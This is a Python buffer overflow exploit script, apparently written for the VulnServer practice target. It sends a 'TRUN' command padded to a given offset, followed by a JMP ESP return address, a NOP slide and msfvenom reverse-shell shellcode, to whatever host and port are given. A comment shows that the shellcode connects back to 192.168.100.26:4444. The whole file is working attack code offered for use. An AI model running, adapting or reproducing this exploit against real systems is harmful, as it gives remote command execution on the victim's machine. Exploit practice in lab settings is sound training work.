#!/usr/bin/env python3

import sys, socket
import struct
from datetime import datetime
from time import sleep

if len(sys.argv) != 4:
    print(f'Syntax: {sys.argv[0]} <hostname> <port> <offset>')
    exit(1)

hostname = sys.argv[1]
port = int(sys.argv[2])
offset = int(sys.argv[3])

try:
    host = socket.gethostbyname(hostname)
except socket.gaierror:
    print(f"Hostname could not be resolved: {hostname}")
    exit(1)
except socket.error:
    print(f"Could not connect to hostname: {hostname}")
    exit(1)

print("-" * 50)
print(f"Target: {host}:{port}")
print(f"Time: {datetime.now()}")
print("-" * 50)

command = b"TRUN /.:/"
padding = b"A" * offset
# little-endian opcode
jmp_esp_opcode = struct.pack("<I", 0x625011af)
eip = jmp_esp_opcode
nop_slide = b"\x90" * 32

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.26 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
shellcode = (
    b"\xbb\xf0\x9a\xa1\xb4\xdb\xd9\xd9\x74\x24\xf4\x5a\x29\xc9"
    b"\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\x32\x9e\x43\x41\x4e"
    b"\x77\x01\xaa\xae\x88\x66\x22\x4b\xb9\xa6\x50\x18\xea\x16"
    b"\x12\x4c\x07\xdc\x76\x64\x9c\x90\x5e\x8b\x15\x1e\xb9\xa2"
    b"\xa6\x33\xf9\xa5\x24\x4e\x2e\x05\x14\x81\x23\x44\x51\xfc"
    b"\xce\x14\x0a\x8a\x7d\x88\x3f\xc6\xbd\x23\x73\xc6\xc5\xd0"
    b"\xc4\xe9\xe4\x47\x5e\xb0\x26\x66\xb3\xc8\x6e\x70\xd0\xf5"
    b"\x39\x0b\x22\x81\xbb\xdd\x7a\x6a\x17\x20\xb3\x99\x69\x65"
    b"\x74\x42\x1c\x9f\x86\xff\x27\x64\xf4\xdb\xa2\x7e\x5e\xaf"
    b"\x15\x5a\x5e\x7c\xc3\x29\x6c\xc9\x87\x75\x71\xcc\x44\x0e"
    b"\x8d\x45\x6b\xc0\x07\x1d\x48\xc4\x4c\xc5\xf1\x5d\x29\xa8"
    b"\x0e\xbd\x92\x15\xab\xb6\x3f\x41\xc6\x95\x57\xa6\xeb\x25"
    b"\xa8\xa0\x7c\x56\x9a\x6f\xd7\xf0\x96\xf8\xf1\x07\xd8\xd2"
    b"\x46\x97\x27\xdd\xb6\xbe\xe3\x89\xe6\xa8\xc2\xb1\x6c\x28"
    b"\xea\x67\x22\x78\x44\xd8\x83\x28\x24\x88\x6b\x22\xab\xf7"
    b"\x8c\x4d\x61\x90\x27\xb4\xe2\x5f\x1f\xd2\xe8\x37\x62\x1a"
    b"\x1c\x94\xeb\xfc\x74\x34\xba\x57\xe1\xad\xe7\x23\x90\x32"
    b"\x32\x4e\x92\xb9\xb1\xaf\x5d\x4a\xbf\xa3\x0a\xba\x8a\x99"
    b"\x9d\xc5\x20\xb5\x42\x57\xaf\x45\x0c\x44\x78\x12\x59\xba"
    b"\x71\xf6\x77\xe5\x2b\xe4\x85\x73\x13\xac\x51\x40\x9a\x2d"
    b"\x17\xfc\xb8\x3d\xe1\xfd\x84\x69\xbd\xab\x52\xc7\x7b\x02"
    b"\x15\xb1\xd5\xf9\xff\x55\xa3\x31\xc0\x23\xac\x1f\xb6\xcb"
    b"\x1d\xf6\x8f\xf4\x92\x9e\x07\x8d\xce\x3e\xe7\x44\x4b\x5e"
    b"\x0a\x4c\xa6\xf7\x93\x05\x0b\x9a\x23\xf0\x48\xa3\xa7\xf0"
    b"\x30\x50\xb7\x71\x34\x1c\x7f\x6a\x44\x0d\xea\x8c\xfb\x2e"
    b"\x3f"
)

buff = command + padding + eip + nop_slide + shellcode
buff_len = len(buff)

socket.setdefaulttimeout(10)

try:
    print(f'Sending {buff_len} bytes...')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    print(s.recv(1024).decode())

    s.send(buff)
    s.close()
except Exception as e:
    print(f"Exception: {e}")
    exit(0)


